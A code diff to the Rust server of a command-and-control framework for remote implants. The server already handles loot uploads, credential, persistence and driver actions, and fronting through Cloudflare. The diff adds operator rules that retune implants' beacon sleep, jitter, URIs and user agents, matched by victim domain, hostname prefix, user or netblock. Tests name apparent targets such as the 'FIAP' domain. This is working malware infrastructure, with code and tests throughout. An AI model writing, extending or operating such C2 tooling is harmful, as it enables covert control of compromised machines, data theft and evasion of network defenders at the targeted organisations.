@@ -2,8 +2,8 @@ use abraham_common::crypto::{self, ClientHello, Session};
 use abraham_common::frame::{open_frames, ProtocolError};
 use abraham_common::http::{read_request, write_response, HttpRequest, HDR_HANDSHAKE, HDR_SESSION};
 use abraham_common::message::{
-    self, collect_action, cred_action, driver_action, msg, persist_action, Chunk, Message,
-    RegisterInfo, Task, TaskBody, TaskResult,
+    self, collect_action, cred_action, driver_action, msg, persist_action, Chunk, ConfigUpdate,
+    Message, RegisterInfo, Task, TaskBody, TaskResult,
 };
 use abraham_common::profile::{Profile, DEFAULT_PROFILE_PATH};
 use ed25519_dalek::SigningKey;
@@ -72,6 +72,12 @@ struct LiveSession {
     results: Arc<RwLock<Vec<StoredResult>>>,
     /// Reassembly buffer for implant→server chunked payloads (loot).
     pending_uploads: SyncMutex<HashMap<u32, Vec<u8>>>,
+    /// Real client address (X-Forwarded-For behind the front); the
+    /// connection peer is the edge.
+    real_ip: SyncMutex<String>,
+    /// Last ConfigUpdate delivered to this implant (None = nothing yet);
+    /// a poll whose resolution differs re-sends before any task.
+    applied_config: SyncMutex<Option<ConfigUpdate>>,
 }
 
 impl LiveSession {
@@ -91,6 +97,158 @@ impl LiveSession {
     fn set_seen(&self) {
         self.last_seen.store(now(), Ordering::SeqCst);
     }
+}
+
+// ---------------------------------------------------------------------------
+// ABR-T037: server-driven configuration. Rules match an implant's
+// registration attributes (domain, hostname prefix, user, source netblock)
+// and resolve to a ConfigUpdate delivered inside the REGISTER response or
+// the first poll after the resolution changes. First rule that matches
+// wins; every field is optional and ANDed; absent fields are wildcards.
+// ---------------------------------------------------------------------------
+
+#[derive(serde::Serialize, serde::Deserialize, Clone, Debug, PartialEq, Default)]
+struct ConfigRule {
+    #[serde(default)]
+    note: String,
+    /// Exact domain match, case-insensitive (e.g. "FIAP").
+    #[serde(default)]
+    match_domain: Option<String>,
+    /// Hostname prefix match, case-insensitive (e.g. "PA202").
+    #[serde(default)]
+    match_hostname_prefix: Option<String>,
+    /// Exact username match, case-insensitive.
+    #[serde(default)]
+    match_user: Option<String>,
+    /// IPv4 CIDR the client's real address must fall in (the X-Forwarded-For
+    /// address behind the front; the connection peer is the edge).
+    #[serde(default)]
+    match_net: Option<String>,
+    #[serde(default)]
+    sleep_secs: Option<u64>,
+    #[serde(default)]
+    jitter: Option<f32>,
+    #[serde(default)]
+    uris: Vec<String>,
+    #[serde(default)]
+    user_agents: Vec<String>,
+}
+
+#[derive(serde::Serialize, serde::Deserialize, Clone, Debug, PartialEq, Default)]
+struct ConfigRules {
+    /// Bumped on every operator change; rides each delivered update.
+    #[serde(default)]
+    epoch: u64,
+    #[serde(default)]
+    rules: Vec<ConfigRule>,
+}
+
+/// IPv4 "a.b.c.d/len" -> (network, mask); None when malformed.
+fn parse_cidr(spec: &str) -> Option<(u32, u32)> {
+    let (addr, len) = spec.split_once('/')?;
+    let len: u32 = len.parse().ok()?;
+    if len > 32 {
+        return None;
+    }
+    let mut ip: u32 = 0;
+    for part in addr.split('.') {
+        let octet: u32 = part.parse().ok()?;
+        if octet > 255 {
+            return None;
+        }
+        ip = (ip << 8) | octet;
+    }
+    let mask = if len == 0 { 0 } else { u32::MAX << (32 - len) };
+    Some((ip & mask, mask))
+}
+
+impl ConfigRule {
+    fn matches(&self, domain: &str, hostname: &str, user: &str, ip: &str) -> bool {
+        let ip_num = ip
+            .split('.')
+            .filter_map(|p| p.parse::<u32>().ok())
+            .fold(None, |acc: Option<u32>, o| {
+                acc.map(|a| (a << 8) | o).or(Some(o))
+            });
+        if let Some(want) = &self.match_domain {
+            if !want.eq_ignore_ascii_case(domain) {
+                return false;
+            }
+        }
+        if let Some(prefix) = &self.match_hostname_prefix {
+            if !hostname
+                .to_ascii_lowercase()
+                .starts_with(&prefix.to_ascii_lowercase())
+            {
+                return false;
+            }
+        }
+        if let Some(want) = &self.match_user {
+            if !want.eq_ignore_ascii_case(user) {
+                return false;
+            }
+        }
+        if let (Some(spec), Some(ipv4)) = (&self.match_net, ip_num) {
+            match parse_cidr(spec) {
+                Some((net, mask)) => {
+                    if ipv4 & mask != net {
+                        return false;
+                    }
+                }
+                None => return false,
+            }
+        }
+        true
+    }
+
+    /// The update this rule resolves to; unlisted fields keep whatever the
+    /// implant already runs (KEEP sentinels).
+    fn update(&self, epoch: u64) -> ConfigUpdate {
+        ConfigUpdate {
+            epoch,
+            sleep_secs: self.sleep_secs.unwrap_or(ConfigUpdate::KEEP_SLEEP_SECS),
+            jitter: self.jitter.unwrap_or(ConfigUpdate::KEEP_JITTER),
+            uris: self.uris.clone(),
+            user_agents: self.user_agents.clone(),
+        }
+    }
+}
+
+impl ConfigRules {
+    /// First rule that matches wins (operator decision, 2026-09-14).
+    fn resolve(&self, domain: &str, hostname: &str, user: &str, ip: &str) -> Option<&ConfigRule> {
+        self.rules
+            .iter()
+            .find(|rule| rule.matches(domain, hostname, user, ip))
+    }
+}
+
+/// The client's real address from the fronting proxy headers — the
+/// connection peer is the edge (Cloudflare), not the implant. Header
+/// values are raw bytes in the HTTP layer; the first entry of a
+/// forwarded list wins (closest to the origin of the request chain we
+/// care about is the front's view of the client).
+fn client_ip_of(req: &HttpRequest) -> Option<String> {
+    for name in ["cf-connecting-ip", "x-forwarded-for"] {
+        if let Some(forwarded) = req.header(name) {
+            let text = std::str::from_utf8(forwarded).ok()?;
+            let first = text.split(',').next()?.trim();
+            if !first.is_empty() {
+                return Some(first.to_string());
+            }
+        }
+    }
+    None
+}
+
+/// Config frames go only to implants whose decoder knows kind 0x10;
+/// older builds fail the frame as malformed (strict decode).
+fn implant_supports_config(version: &str) -> bool {
+    let mut parts = version.split('.');
+    let major: u32 = parts.next().unwrap_or("0").parse().unwrap_or(0);
+    let minor: u32 = parts.next().unwrap_or("0").parse().unwrap_or(0);
+    let patch: u32 = parts.next().unwrap_or("0").parse().unwrap_or(0);
+    (major, minor, patch) >= (0, 2, 1)
 }
 
 struct AppState {
@@ -118,6 +276,10 @@ struct AppState {
     /// A session whose last_seen age exceeds this is reported stale by
     /// list_sessions (10x profile sleep, clamped).
     stale_after_secs: u64,
+    /// ABR-T037 rule table (operator-managed via mgmt `cfg` commands).
+    config: SyncMutex<ConfigRules>,
+    /// Where the rule table persists (sibling of the session state file).
+    config_path: Option<PathBuf>,
 }
 
 fn now() -> u64 {
@@ -125,6 +287,24 @@ fn now() -> u64 {
         .duration_since(UNIX_EPOCH)
         .map(|d| d.as_secs())
         .unwrap_or(0)
+}
+
+/// Persists the ABR-T037 rule table next to the session state. Best-effort
+/// like every persistence path: a failure is surfaced to the operator's
+/// console, never fatal to serving.
+fn save_config_rules(state: &AppState) {
+    let Some(path) = state.config_path.clone() else {
+        return;
+    };
+    let rules = state.config.lock().unwrap().clone();
+    match serde_json::to_string_pretty(&rules) {
+        Ok(text) => {
+            if let Err(e) = std::fs::write(&path, text) {
+                eprintln!("[!] config rules save failed: {e}");
+            }
+        }
+        Err(e) => eprintln!("[!] config rules serialize failed: {e}"),
+    }
 }
 
 /// Appends one JSON line to the audit log — the after-action record of
@@ -289,6 +469,27 @@ async fn main() -> anyhow::Result<()> {
         .with_single_cert(certs, key)?;
     let acceptor = TlsAcceptor::from(Arc::new(tls_config));
 
+    // ABR-T037: the rule table persists next to the session state
+    // (sessions.json -> config-rules.json) so a restart keeps the
+    // operator's configuration policy.
+    let config_path = state_path.as_ref().map(|p| {
+        let mut sibling = p.clone();
+        sibling.set_file_name("config-rules.json");
+        sibling
+    });
+    let config = match &config_path {
+        Some(path) if path.exists() => match std::fs::read_to_string(path) {
+            Ok(text) => serde_json::from_str(&text).unwrap_or_else(|e| {
+                eprintln!("[!] config rules load failed ({e}); starting empty");
+                ConfigRules::default()
+            }),
+            Err(e) => {
+                eprintln!("[!] config rules read failed ({e}); starting empty");
+                ConfigRules::default()
+            }
+        },
+        _ => ConfigRules::default(),
+    };
     let state = Arc::new(AppState {
         sessions: RwLock::new(HashMap::new()),
         tokens: RwLock::new(HashMap::new()),
@@ -300,6 +501,8 @@ async fn main() -> anyhow::Result<()> {
         audit_path: SyncMutex::new(audit_path),
         mgmt_token,
         stale_after_secs: (profile.sleep_secs.saturating_mul(10)).clamp(120, 86_400),
+        config: SyncMutex::new(config),
+        config_path,
     });
     if let Some(path) = &state.state_path {
         match load_state(&state, path).await {
@@ -510,9 +713,17 @@ async fn run_session<S: AsyncRead + AsyncWrite + Unpin>(
         if let Some(token) = session_token_of(&req, &profile.cookie_name) {
             let provisional = state.provisionals.lock().unwrap().remove(&token);
             if let Some((session, _)) = provisional {
-                conn_session = register(&mut stream, &req.body, session, peer, &state, &profile)
-                    .await?
-                    .or(conn_session);
+                conn_session = register(
+                    &mut stream,
+                    &req.body,
+                    session,
+                    peer,
+                    client_ip_of(&req),
+                    &state,
+                    &profile,
+                )
+                .await?
+                .or(conn_session);
                 continue;
             }
             let live = {
@@ -530,9 +741,17 @@ async fn run_session<S: AsyncRead + AsyncWrite + Unpin>(
             continue;
         }
         if let Some(session) = conn_hello.take() {
-            conn_session = register(&mut stream, &req.body, session, peer, &state, &profile)
-                .await?
-                .or(conn_session);
+            conn_session = register(
+                &mut stream,
+                &req.body,
+                session,
+                peer,
+                client_ip_of(&req),
+                &state,
+                &profile,
+            )
+            .await?
+            .or(conn_session);
             continue;
         }
         if let Some(live) = conn_session.clone() {
@@ -553,6 +772,7 @@ async fn register<S: AsyncWrite + Unpin>(
     body: &[u8],
     mut session: Session,
     peer: SocketAddr,
+    client_ip: Option<String>,
     state: &Arc<AppState>,
     profile: &Profile,
 ) -> Result<Option<Arc<LiveSession>>, anyhow::Error> {
@@ -582,6 +802,7 @@ async fn register<S: AsyncWrite + Unpin>(
         *live.crypto.lock().unwrap() = Some(session);
         *live.info.lock().unwrap() = info.clone();
         *live.addr.lock().unwrap() = peer.to_string();
+        *live.real_ip.lock().unwrap() = client_ip.unwrap_or_default();
         live.set_seen();
         println!("[~] session {} resumed from {peer}", live.id);
         audit(
@@ -601,6 +822,8 @@ async fn register<S: AsyncWrite + Unpin>(
             pending: SyncMutex::new(VecDeque::new()),
             results: Arc::new(RwLock::new(Vec::<StoredResult>::new())),
             pending_uploads: SyncMutex::new(HashMap::new()),
+            real_ip: SyncMutex::new(client_ip.clone().unwrap_or_default()),
+            applied_config: SyncMutex::new(None),
         });
         state
             .sessions
@@ -632,9 +855,75 @@ async fn register<S: AsyncWrite + Unpin>(
         );
         live
     };
-    write_response(stream, 200, &profile.server_header, b"").await?;
+    // ABR-T037: resolve the implant's rule context and deliver the
+    // update inside the REGISTER response — config reaches the beacon
+    // on its very first exchange, before any poll.
+    if let Some(update) = resolved_config_for(state, &live) {
+        if deliver_config(stream, &live, &update, state, profile)
+            .await
+            .is_err()
+        {
+            eprintln!("[!] session {}: config delivery write failed", live.id);
+        }
+    } else {
+        write_response(stream, 200, &profile.server_header, b"").await?;
+    }
     persist_state(state).await;
     Ok(Some(live))
+}
+
+/// Resolves the session's rule context to an update that still changes
+/// something AND differs from what this implant last applied. `None`
+/// means "nothing to send".
+fn resolved_config_for(state: &AppState, live: &Arc<LiveSession>) -> Option<ConfigUpdate> {
+    let rules = state.config.lock().unwrap().clone();
+    let (domain, hostname, username, version) = {
+        let info = live.info.lock().unwrap();
+        (
+            info.domain.clone(),
+            info.hostname.clone(),
+            info.username.clone(),
+            info.implant_version.clone(),
+        )
+    };
+    let ip = live.real_ip.lock().unwrap().clone();
+    if !implant_supports_config(&version) {
+        return None;
+    }
+    let update = rules
+        .resolve(&domain, &hostname, &username, &ip)
+        .map(|rule| rule.update(rules.epoch))
+        .filter(|update| update.changes_something())?;
+    let applied = live.applied_config.lock().unwrap().clone();
+    if applied.as_ref() == Some(&update) {
+        return None;
+    }
+    Some(update)
+}
+
+/// Writes a 200 whose sealed frames carry the CONFIG update followed by
+/// BatchEnd (the implant opens REGISTER responses like any frame body).
+async fn deliver_config<S: AsyncWrite + Unpin>(
+    stream: &mut S,
+    live: &Arc<LiveSession>,
+    update: &ConfigUpdate,
+    state: &Arc<AppState>,
+    profile: &Profile,
+) -> Result<(), anyhow::Error> {
+    let mut body = Vec::new();
+    let (mt, payload) = Message::Config(update.clone()).encode();
+    body.extend_from_slice(&live.seal(mt, &payload)?);
+    let (mt, payload) = Message::BatchEnd.encode();
+    body.extend_from_slice(&live.seal(mt, &payload)?);
+    *live.applied_config.lock().unwrap() = Some(update.clone());
+    audit(
+        state,
+        "config_delivered",
+        json!({ "session": live.id, "epoch": update.epoch }),
+    );
+    write_response(stream, 200, &profile.server_header, &body)
+        .await
+        .map_err(anyhow::Error::from)
 }
 
 /// Serves one request of an established session (poll/result/chunk/ping).
@@ -677,12 +966,26 @@ async fn serve_session<S: AsyncWrite + Unpin>(
             }
             msg::TASK_POLL => {
                 live.set_seen();
+                // ABR-T037: a rule change that re-resolves for this
+                // implant lands on the next poll, before any tasking.
+                let pending_config = resolved_config_for(state, live);
                 let outbound: Vec<Message> =
                     std::mem::take(&mut *live.pending.lock().unwrap()).into();
-                if outbound.is_empty() {
+                if let Some(update) = &pending_config {
+                    let (mt, payload) = Message::Config(update.clone()).encode();
+                    response.extend_from_slice(&live.seal(mt, &payload)?);
+                    *live.applied_config.lock().unwrap() = Some(update.clone());
+                    audit(
+                        state,
+                        "config_delivered",
+                        json!({ "session": live.id, "epoch": update.epoch }),
+                    );
+                    empty_poll = false;
+                }
+                if outbound.is_empty() && pending_config.is_none() {
                     let version = { live.info.lock().unwrap().implant_version.clone() };
                     empty_poll = implant_supports_204(&version);
-                } else {
+                } else if !outbound.is_empty() {
                     for message in &outbound {
                         if let Message::Task(task) = message {
                             audit(
@@ -1010,6 +1313,8 @@ async fn load_state(state: &Arc<AppState>, path: &Path) -> anyhow::Result<usize>
             pending: SyncMutex::new(pending_queue),
             results: Arc::new(RwLock::new(persisted.results)),
             pending_uploads: SyncMutex::new(HashMap::new()),
+            real_ip: SyncMutex::new(String::new()),
+            applied_config: SyncMutex::new(None),
         });
         if token != 0 {
             state.tokens.write().await.insert(token, id);
@@ -1341,6 +1646,118 @@ async fn handle_mgmt(request: Value, state: &Arc<AppState>) -> Value {
                     )
                     .await
                 }
+            }
+        }
+        "cfg" => {
+            // ABR-T037: operator management of the server-driven
+            // configuration rule table. First rule that matches wins;
+            // changes bump the epoch and re-resolve on every poll.
+            let action = request.get("action").and_then(|v| v.as_str()).unwrap_or("");
+            match action {
+                "list" => {
+                    let rules = state.config.lock().unwrap().clone();
+                    json!({
+                        "epoch": rules.epoch,
+                        "rules": rules.rules.iter().enumerate().map(|(index, rule)| {
+                            json!({
+                                "index": index,
+                                "note": rule.note,
+                                "match_domain": rule.match_domain,
+                                "match_hostname_prefix": rule.match_hostname_prefix,
+                                "match_user": rule.match_user,
+                                "match_net": rule.match_net,
+                                "sleep_secs": rule.sleep_secs,
+                                "jitter": rule.jitter,
+                                "uris": rule.uris,
+                                "user_agents": rule.user_agents,
+                            })
+                        }).collect::<Vec<_>>()
+                    })
+                }
+                "add" => {
+                    let rule: ConfigRule = match request.get("rule") {
+                        Some(value) => match serde_json::from_value(value.clone()) {
+                            Ok(rule) => rule,
+                            Err(e) => return json!({ "error": format!("bad rule: {e}") }),
+                        },
+                        None => return json!({ "error": "cfg add requires rule (JSON object)" }),
+                    };
+                    if rule.match_domain.is_none()
+                        && rule.match_hostname_prefix.is_none()
+                        && rule.match_user.is_none()
+                        && rule.match_net.is_none()
+                    {
+                        return json!({ "error": "rule needs at least one match field (domain, hostname_prefix, user, net)" });
+                    }
+                    if rule.sleep_secs.is_none()
+                        && rule.jitter.is_none()
+                        && rule.uris.is_empty()
+                        && rule.user_agents.is_empty()
+                    {
+                        return json!({ "error": "rule changes nothing (set sleep_secs, jitter, uris and/or user_agents)" });
+                    }
+                    let mut rules = state.config.lock().unwrap();
+                    rules.epoch += 1;
+                    rules.rules.push(rule);
+                    let epoch = rules.epoch;
+                    let count = rules.rules.len();
+                    drop(rules);
+                    save_config_rules(state);
+                    audit(
+                        state,
+                        "config_rule_changed",
+                        json!({ "action": "add", "epoch": epoch }),
+                    );
+                    json!({ "ok": true, "epoch": epoch, "rules": count })
+                }
+                "remove" => {
+                    let index = match request.get("index").and_then(|v| v.as_u64()) {
+                        Some(index) => index as usize,
+                        None => return json!({ "error": "cfg remove requires index" }),
+                    };
+                    let mut rules = state.config.lock().unwrap();
+                    if index >= rules.rules.len() {
+                        return json!({ "error": format!("index {index} out of range ({} rules)", rules.rules.len()) });
+                    }
+                    rules.rules.remove(index);
+                    rules.epoch += 1;
+                    let epoch = rules.epoch;
+                    drop(rules);
+                    save_config_rules(state);
+                    audit(
+                        state,
+                        "config_rule_changed",
+                        json!({ "action": "remove", "index": index, "epoch": epoch }),
+                    );
+                    json!({ "ok": true, "epoch": epoch })
+                }
+                "test" => {
+                    let pick = |name: &str| {
+                        request
+                            .get(name)
+                            .and_then(|v| v.as_str())
+                            .unwrap_or("")
+                            .to_string()
+                    };
+                    let (domain, hostname, user, ip) =
+                        (pick("domain"), pick("hostname"), pick("user"), pick("ip"));
+                    let rules = state.config.lock().unwrap().clone();
+                    match rules.resolve(&domain, &hostname, &user, &ip) {
+                        Some(rule) => {
+                            let update = rule.update(rules.epoch);
+                            json!({
+                                "matched": true,
+                                "note": rule.note,
+                                "sleep_secs": update.sleep_secs,
+                                "jitter": update.jitter,
+                                "uris": update.uris,
+                                "user_agents": update.user_agents,
+                            })
+                        }
+                        None => json!({ "matched": false }),
+                    }
+                }
+                _ => json!({ "error": "cfg action must be list, add, remove or test" }),
             }
         }
         "psrun" => {
@@ -1715,6 +2132,8 @@ mod tests {
             audit_path: SyncMutex::new(None),
             mgmt_token,
             stale_after_secs: 120,
+            config: SyncMutex::new(ConfigRules::default()),
+            config_path: None,
         })
     }
 
@@ -2146,6 +2565,208 @@ mod tests {
         // Delivered: the next idle poll is empty again -> 204.
         let (status, _) = poll_raw(&mut client, &profile, &mut a, 7171, HDR_SESSION).await;
         assert_eq!(status, 204);
+    }
+
+    // ------------------------------------------------------------------
+    // ABR-T037: server-driven configuration
+    // ------------------------------------------------------------------
+
+    #[test]
+    fn config_rule_matcher_and_precedence() {
+        let net_rule = ConfigRule {
+            note: "net".into(),
+            match_domain: None,
+            match_hostname_prefix: None,
+            match_user: None,
+            match_net: Some("10.20.0.0/16".into()),
+            sleep_secs: Some(5),
+            jitter: None,
+            uris: Vec::new(),
+            user_agents: Vec::new(),
+        };
+        let domain_rule = ConfigRule {
+            note: "fiap".into(),
+            match_domain: Some("FIAP".into()),
+            match_hostname_prefix: None,
+            match_user: None,
+            match_net: None,
+            sleep_secs: Some(2),
+            jitter: Some(0.1),
+            uris: vec!["/cdn/update".into()],
+            user_agents: Vec::new(),
+        };
+        // Netblock matching, including a /16 boundary.
+        assert!(net_rule.matches("x", "y", "z", "10.20.255.254"));
+        assert!(!net_rule.matches("x", "y", "z", "10.21.0.1"));
+        // Domain matching is case-insensitive on both sides.
+        assert!(domain_rule.matches("fiap", "PA202MICRO35", "labsfiap", "1.2.3.4"));
+        assert!(!domain_rule.matches("OTHER", "PA202MICRO35", "labsfiap", "1.2.3.4"));
+        // Hostname prefix matching.
+        let mut prefix_rule = net_rule.clone();
+        prefix_rule.match_hostname_prefix = Some("pa202".into());
+        prefix_rule.match_net = None;
+        assert!(prefix_rule.matches("X", "PA202MICRO35", "u", "9.9.9.9"));
+        assert!(!prefix_rule.matches("X", "WRK0001", "u", "9.9.9.9"));
+        // Malformed CIDR never matches.
+        let mut bad_rule = net_rule.clone();
+        bad_rule.match_net = Some("10.0.0.0/40".into());
+        assert!(!bad_rule.matches("x", "y", "z", "10.0.0.1"));
+        // FIRST rule that matches wins.
+        let rules = ConfigRules {
+            epoch: 9,
+            rules: vec![net_rule, domain_rule],
+        };
+        let hit = rules
+            .resolve("FIAP", "PA202MICRO35", "labsfiap", "10.20.1.1")
+            .unwrap();
+        assert_eq!(hit.note, "net", "first matching rule must win");
+        // Update derivation keeps unspecified fields as KEEP sentinels.
+        let only_sleep = ConfigRule {
+            note: "only-sleep".into(),
+            sleep_secs: Some(3),
+            ..Default::default()
+        };
+        let update = only_sleep.update(4);
+        assert_eq!(update.sleep_secs, 3);
+        assert_eq!(update.jitter, ConfigUpdate::KEEP_JITTER);
+        assert!(update.uris.is_empty());
+        assert!(update.changes_something());
+        assert!(!ConfigUpdate::noop(4).changes_something());
+    }
+
+    #[test]
+    fn config_gate_by_implant_version() {
+        assert!(implant_supports_config("0.2.1"));
+        assert!(implant_supports_config("0.3.0"));
+        assert!(!implant_supports_config("0.2.0"));
+        assert!(!implant_supports_config("0.1.0"));
+        assert!(!implant_supports_config("test"));
+    }
+
+    /// Registers with a custom implant version (link() hardcodes the
+    /// test build string).
+    async fn link_as_version(
+        stream: &mut DuplexStream,
+        state: &AppState,
+        profile: &Profile,
+        token: u64,
+        version: &str,
+    ) -> Session {
+        let session = link(stream, state, profile, token).await;
+        set_implant_version(state, token, version).await;
+        session
+    }
+
+    #[tokio::test]
+    async fn config_rides_register_and_re_resolves_on_poll() {
+        let (mut client, server_end) = tokio::io::duplex(64 * 1024);
+        let state = test_state(None, None);
+        let profile = Profile::default();
+        spawn_server(server_end, state.clone(), profile.clone());
+
+        // Rule active BEFORE the implant links: the update must ride the
+        // REGISTER response.
+        {
+            let mut rules = state.config.lock().unwrap();
+            rules.epoch += 1;
+            rules.rules.push(ConfigRule {
+                note: "lab fast".into(),
+                match_domain: Some("LAB".into()),
+                sleep_secs: Some(2),
+                jitter: Some(0.1),
+                ..Default::default()
+            });
+        }
+        let uri = profile.uris[0].as_str();
+        // link() consumes the register response; do the handshake part
+        // manually here so the response frames can be inspected.
+        let tag = 9090u64.to_string();
+        let (secret, hello) = ClientHello::generate();
+        write_request(
+            &mut client,
+            "POST",
+            uri,
+            "h",
+            "ua",
+            &[(HDR_HANDSHAKE, "1"), (HDR_SESSION, &tag)],
+            &hello.to_bytes(),
+        )
+        .await
+        .unwrap();
+        let resp = read_response(&mut client).await.unwrap();
+        let raw: [u8; crypto::SERVER_HELLO_LEN] = resp.body.as_slice().try_into().unwrap();
+        let mut session = crypto::client_finish(
+            &state.signing_key.verifying_key(),
+            secret,
+            &hello,
+            &crypto::ServerHello::from_bytes(&raw),
+        )
+        .unwrap();
+        let mut info = register_info(9090);
+        info.implant_version = "0.2.1".into();
+        let (mt, body) = Message::Register(info).encode();
+        let frame = session.seal(mt, &body).unwrap();
+        write_request(
+            &mut client,
+            "POST",
+            uri,
+            "h",
+            "ua",
+            &[(HDR_SESSION, &tag)],
+            &frame,
+        )
+        .await
+        .unwrap();
+        let resp = read_response(&mut client).await.unwrap();
+        assert_eq!(resp.status, 200);
+        let frames = open_frames(&resp.body, &mut session).unwrap();
+        let config = frames
+            .iter()
+            .find(|(mt, _)| *mt == msg::CONFIG)
+            .expect("REGISTER response carries the CONFIG frame");
+        let Message::Config(update) = Message::decode(msg::CONFIG, &config.1).unwrap() else {
+            panic!("undecodable CONFIG");
+        };
+        assert_eq!(update.sleep_secs, 2);
+        assert_eq!(update.jitter, 0.1);
+
+        // Idle poll after delivery: nothing new -> plain 204 again.
+        let (status, _) = poll_raw(&mut client, &profile, &mut session, 9090, HDR_SESSION).await;
+        assert_eq!(status, 204);
+
+        // Operator tightens the rule: the next poll re-delivers BEFORE
+        // any tasking and is never a 204.
+        {
+            let mut rules = state.config.lock().unwrap();
+            rules.epoch += 1;
+            rules.rules[0].sleep_secs = Some(1);
+        }
+        let (status, body) = poll_raw(&mut client, &profile, &mut session, 9090, HDR_SESSION).await;
+        assert_eq!(status, 200);
+        let frames = open_frames(&body, &mut session).unwrap();
+        let config = frames
+            .iter()
+            .find(|(mt, _)| *mt == msg::CONFIG)
+            .expect("changed rule re-delivers on the next poll");
+        let Message::Config(update) = Message::decode(msg::CONFIG, &config.1).unwrap() else {
+            panic!("undecodable CONFIG");
+        };
+        assert_eq!(update.sleep_secs, 1);
+
+        // A 0.2.0 implant never receives CONFIG frames (strict decoder).
+        let mut old = link_as_version(&mut client, &state, &profile, 9191, "0.2.0").await;
+        {
+            let mut rules = state.config.lock().unwrap();
+            rules.epoch += 1;
+            rules.rules.push(ConfigRule {
+                note: "all".into(),
+                sleep_secs: Some(4),
+                ..Default::default()
+            });
+        }
+        let (status, body) = poll_raw(&mut client, &profile, &mut old, 9191, HDR_SESSION).await;
+        assert_eq!(status, 204, "legacy implant keeps the plain 204");
+        assert!(body.is_empty());
     }
 
     /// The session token rides in the profile-named cookie instead of
